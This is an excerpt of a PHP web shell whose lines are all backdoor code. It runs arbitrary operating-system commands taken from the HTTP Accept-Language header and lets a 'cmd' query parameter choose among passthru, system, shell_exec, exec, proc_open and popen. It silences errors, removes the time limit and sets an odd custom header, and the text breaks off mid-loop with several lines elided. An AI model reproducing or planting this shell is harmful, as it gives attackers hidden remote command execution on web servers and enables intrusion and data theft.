<?php 
header('tsecnetwork-Type: http_accept_language_get');
set_time_limit(0);
error_reporting(0);
...
if ($_GET['cmd'] == "passthru") {
    passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']);
} elseif ($_GET['cmd'] == "system") {
    system($_SERVER['HTTP_ACCEPT_LANGUAGE']);
} elseif ($_GET['cmd'] == "shell_exec") {
    echo shell_exec($_SERVER['HTTP_ACCEPT_LANGUAGE']);
} elseif ($_GET['cmd'] == "exec") {
    echo exec($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    ...
    $process = proc_open($_SERVER['HTTP_ACCEPT_LANGUAGE'], $descriptorspec, $pipes);
    ...
    $handle = popen($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'r');
    if ($handle) {
        while (!feof($handle)) {
